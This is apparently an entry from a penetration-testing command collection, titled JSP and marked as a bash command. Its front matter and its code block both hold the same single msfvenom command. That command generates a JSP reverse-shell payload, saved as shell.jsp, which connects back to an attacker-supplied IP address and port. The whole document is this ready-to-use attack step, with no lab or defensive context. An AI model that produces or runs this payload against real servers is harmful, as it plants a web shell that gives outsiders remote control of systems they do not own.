---
id: afbf0ec2-7236-4c4b-8d91-b3c5e51456cf
name: JSP
type: command
executor: bash
data: 'msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your
  Port to Connect On> -f raw > shell.jsp

  '
output: null
created_at: '2020-07-14T18:14:34.235582+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# JSP

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp

```
